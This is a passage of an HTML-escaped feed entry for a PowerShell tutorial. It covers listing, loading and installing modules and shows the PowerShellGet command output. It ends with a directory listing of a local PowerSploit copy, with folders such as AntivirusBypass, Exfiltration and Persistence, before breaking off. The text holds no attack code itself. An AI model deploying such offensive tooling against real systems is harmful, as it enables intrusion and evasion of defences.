    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;powershell&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PS C:\Users\George&amp;gt; Get-command -module powershellget
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;CommandType     Name                                               Version    Source
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-----------     ----                                               -------    ------
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Function&lt;/span&gt;        Find-Command                                       &lt;span style=&#34;color:#ae81ff&#34;&gt;2.2&lt;/span&gt;.5      powershellget
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Function&lt;/span&gt;        Find-DscResource                                   &lt;span style=&#34;color:#ae81ff&#34;&gt;2.2&lt;/span&gt;.5      powershellget
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Function&lt;/span&gt;        Find-Module                                        &lt;span style=&#34;color:#ae81ff&#34;&gt;2.2&lt;/span&gt;.5      powershellget
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Function&lt;/span&gt;        Find-RoleCapability                                &lt;span style=&#34;color:#ae81ff&#34;&gt;2.2&lt;/span&gt;.5      powershellget
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Function&lt;/span&gt;        Find-Script                                        &lt;span style=&#34;color:#ae81ff&#34;&gt;2.2&lt;/span&gt;.5      powershellget
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Function&lt;/span&gt;        Get-CredsFromCredentialProvider                    &lt;span style=&#34;color:#ae81ff&#34;&gt;2.2&lt;/span&gt;.5      powershellget
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Function&lt;/span&gt;        Get-InstalledModule                                &lt;span style=&#34;color:#ae81ff&#34;&gt;2.2&lt;/span&gt;.5      powershellget
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Function&lt;/span&gt;        Get-InstalledScript                                &lt;span style=&#34;color:#ae81ff&#34;&gt;2.2&lt;/span&gt;.5      powershellget
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Function&lt;/span&gt;        Get-PSRepository                                   &lt;span style=&#34;color:#ae81ff&#34;&gt;2.2&lt;/span&gt;.5      powershellget
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Function&lt;/span&gt;        Install-Module                                     &lt;span style=&#34;color:#ae81ff&#34;&gt;2.2&lt;/span&gt;.5      powershellget
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Function&lt;/span&gt;        Install-Script                                     &lt;span style=&#34;color:#ae81ff&#34;&gt;2.2&lt;/span&gt;.5      powershellget
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Function&lt;/span&gt;        New-ScriptFileInfo                                 &lt;span style=&#34;color:#ae81ff&#34;&gt;2.2&lt;/span&gt;.5      powershellget
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Function&lt;/span&gt;        Publish-Module                                     &lt;span style=&#34;color:#ae81ff&#34;&gt;2.2&lt;/span&gt;.5      powershellget
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Function&lt;/span&gt;        Publish-Script                                     &lt;span style=&#34;color:#ae81ff&#34;&gt;2.2&lt;/span&gt;.5      powershellget
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Function&lt;/span&gt;        Register-PSRepository                              &lt;span style=&#34;color:#ae81ff&#34;&gt;2.2&lt;/span&gt;.5      powershellget
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Function&lt;/span&gt;        Save-Module                                        &lt;span style=&#34;color:#ae81ff&#34;&gt;2.2&lt;/span&gt;.5      powershellget
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Function&lt;/span&gt;        Save-Script                                        &lt;span style=&#34;color:#ae81ff&#34;&gt;2.2&lt;/span&gt;.5      powershellget
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Function&lt;/span&gt;        Set-PSRepository                                   &lt;span style=&#34;color:#ae81ff&#34;&gt;2.2&lt;/span&gt;.5      powershellget
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Function&lt;/span&gt;        Test-ScriptFileInfo                                &lt;span style=&#34;color:#ae81ff&#34;&gt;2.2&lt;/span&gt;.5      powershellget
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Function&lt;/span&gt;        Uninstall-Module                                   &lt;span style=&#34;color:#ae81ff&#34;&gt;2.2&lt;/span&gt;.5      powershellget
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Function&lt;/span&gt;        Uninstall-Script                                   &lt;span style=&#34;color:#ae81ff&#34;&gt;2.2&lt;/span&gt;.5      powershellget
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Function&lt;/span&gt;        Unregister-PSRepository                            &lt;span style=&#34;color:#ae81ff&#34;&gt;2.2&lt;/span&gt;.5      powershellget
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Function&lt;/span&gt;        Update-Module                                      &lt;span style=&#34;color:#ae81ff&#34;&gt;2.2&lt;/span&gt;.5      powershellget
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Function&lt;/span&gt;        Update-ModuleManifest                              &lt;span style=&#34;color:#ae81ff&#34;&gt;2.2&lt;/span&gt;.5      powershellget
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Function&lt;/span&gt;        Update-Script                                      &lt;span style=&#34;color:#ae81ff&#34;&gt;2.2&lt;/span&gt;.5      powershellget
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Function&lt;/span&gt;        Update-ScriptFileInfo                              &lt;span style=&#34;color:#ae81ff&#34;&gt;2.2&lt;/span&gt;.5      powershellget&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Finding and installing modules from [powershell gallery](&lt;a href=&#34;https://www.powershellgallery.com/&#34;&gt;PowerShell Gallery | Home&lt;/a&gt;)&lt;/p&gt;</description>
      <content>
&lt;h1 id=&#34;0b---learning-powershell&#34;&gt;
  0b - Learning Powershell
  &lt;a href=&#34;#0b---learning-powershell&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h1&gt;
&lt;p&gt;Getting available modules on the system&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;powershell&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Get-Module -ListAvailable&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Getting only loaded modules on the system&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;powershell&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Get-Module&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Loading Module on the system&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;powershell&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Import-Module PowershellGet&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Getting available functions provided by modules&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;powershell&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Get-Command -module &amp;lt;Module_Name&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Output:&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;powershell&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PS C:\Users\George&amp;gt; Get-command -module powershellget
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;CommandType     Name                                               Version    Source
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-----------     ----                                               -------    ------
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Function&lt;/span&gt;        Find-Command                                       &lt;span style=&#34;color:#ae81ff&#34;&gt;2.2&lt;/span&gt;.5      powershellget
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Function&lt;/span&gt;        Find-DscResource                                   &lt;span style=&#34;color:#ae81ff&#34;&gt;2.2&lt;/span&gt;.5      powershellget
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Function&lt;/span&gt;        Find-Module                                        &lt;span style=&#34;color:#ae81ff&#34;&gt;2.2&lt;/span&gt;.5      powershellget
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Function&lt;/span&gt;        Find-RoleCapability                                &lt;span style=&#34;color:#ae81ff&#34;&gt;2.2&lt;/span&gt;.5      powershellget
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Function&lt;/span&gt;        Find-Script                                        &lt;span style=&#34;color:#ae81ff&#34;&gt;2.2&lt;/span&gt;.5      powershellget
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Function&lt;/span&gt;        Get-CredsFromCredentialProvider                    &lt;span style=&#34;color:#ae81ff&#34;&gt;2.2&lt;/span&gt;.5      powershellget
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Function&lt;/span&gt;        Get-InstalledModule                                &lt;span style=&#34;color:#ae81ff&#34;&gt;2.2&lt;/span&gt;.5      powershellget
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Function&lt;/span&gt;        Get-InstalledScript                                &lt;span style=&#34;color:#ae81ff&#34;&gt;2.2&lt;/span&gt;.5      powershellget
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Function&lt;/span&gt;        Get-PSRepository                                   &lt;span style=&#34;color:#ae81ff&#34;&gt;2.2&lt;/span&gt;.5      powershellget
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Function&lt;/span&gt;        Install-Module                                     &lt;span style=&#34;color:#ae81ff&#34;&gt;2.2&lt;/span&gt;.5      powershellget
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Function&lt;/span&gt;        Install-Script                                     &lt;span style=&#34;color:#ae81ff&#34;&gt;2.2&lt;/span&gt;.5      powershellget
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Function&lt;/span&gt;        New-ScriptFileInfo                                 &lt;span style=&#34;color:#ae81ff&#34;&gt;2.2&lt;/span&gt;.5      powershellget
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Function&lt;/span&gt;        Publish-Module                                     &lt;span style=&#34;color:#ae81ff&#34;&gt;2.2&lt;/span&gt;.5      powershellget
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Function&lt;/span&gt;        Publish-Script                                     &lt;span style=&#34;color:#ae81ff&#34;&gt;2.2&lt;/span&gt;.5      powershellget
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Function&lt;/span&gt;        Register-PSRepository                              &lt;span style=&#34;color:#ae81ff&#34;&gt;2.2&lt;/span&gt;.5      powershellget
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Function&lt;/span&gt;        Save-Module                                        &lt;span style=&#34;color:#ae81ff&#34;&gt;2.2&lt;/span&gt;.5      powershellget
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Function&lt;/span&gt;        Save-Script                                        &lt;span style=&#34;color:#ae81ff&#34;&gt;2.2&lt;/span&gt;.5      powershellget
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Function&lt;/span&gt;        Set-PSRepository                                   &lt;span style=&#34;color:#ae81ff&#34;&gt;2.2&lt;/span&gt;.5      powershellget
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Function&lt;/span&gt;        Test-ScriptFileInfo                                &lt;span style=&#34;color:#ae81ff&#34;&gt;2.2&lt;/span&gt;.5      powershellget
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Function&lt;/span&gt;        Uninstall-Module                                   &lt;span style=&#34;color:#ae81ff&#34;&gt;2.2&lt;/span&gt;.5      powershellget
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Function&lt;/span&gt;        Uninstall-Script                                   &lt;span style=&#34;color:#ae81ff&#34;&gt;2.2&lt;/span&gt;.5      powershellget
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Function&lt;/span&gt;        Unregister-PSRepository                            &lt;span style=&#34;color:#ae81ff&#34;&gt;2.2&lt;/span&gt;.5      powershellget
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Function&lt;/span&gt;        Update-Module                                      &lt;span style=&#34;color:#ae81ff&#34;&gt;2.2&lt;/span&gt;.5      powershellget
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Function&lt;/span&gt;        Update-ModuleManifest                              &lt;span style=&#34;color:#ae81ff&#34;&gt;2.2&lt;/span&gt;.5      powershellget
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Function&lt;/span&gt;        Update-Script                                      &lt;span style=&#34;color:#ae81ff&#34;&gt;2.2&lt;/span&gt;.5      powershellget
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Function&lt;/span&gt;        Update-ScriptFileInfo                              &lt;span style=&#34;color:#ae81ff&#34;&gt;2.2&lt;/span&gt;.5      powershellget&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Finding and installing modules from [powershell gallery](&lt;a href=&#34;https://www.powershellgallery.com/&#34;&gt;PowerShell Gallery | Home&lt;/a&gt;)&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;powershell&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Find-Module -Name admintoolbox | Install-Module&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Installing module from local files&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;powershell&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Directory&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt; C:\Users\George\Desktop\PowerSploit
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Mode                 LastWriteTime         Length Name
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;----                 -------------         ------ ----
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;d----            &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;/&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;/&lt;span style=&#34;color:#ae81ff&#34;&gt;2025&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;42&lt;/span&gt; AM                AntivirusBypass
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;d----            &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;/&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;/&lt;span style=&#34;color:#ae81ff&#34;&gt;2025&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;42&lt;/span&gt; AM                CodeExecution
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;d----            &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;/&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;/&lt;span style=&#34;color:#ae81ff&#34;&gt;2025&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;42&lt;/span&gt; AM                docs
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;d----            &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;/&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;/&lt;span style=&#34;color:#ae81ff&#34;&gt;2025&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;42&lt;/span&gt; AM                Exfiltration
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;d----            &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;/&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;/&lt;span style=&#34;color:#ae81ff&#34;&gt;2025&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;42&lt;/span&gt; AM                Mayhem
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;d----            &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;/&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;/&lt;span style=&#34;color:#ae81ff&#34;&gt;2025&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;42&lt;/span&gt; AM                Persistence
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;d----            &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;/&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;/&lt;span style=&#34;color:#ae81ff&#34;&gt;2025&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;42&lt;/span&gt; AM                Privesc
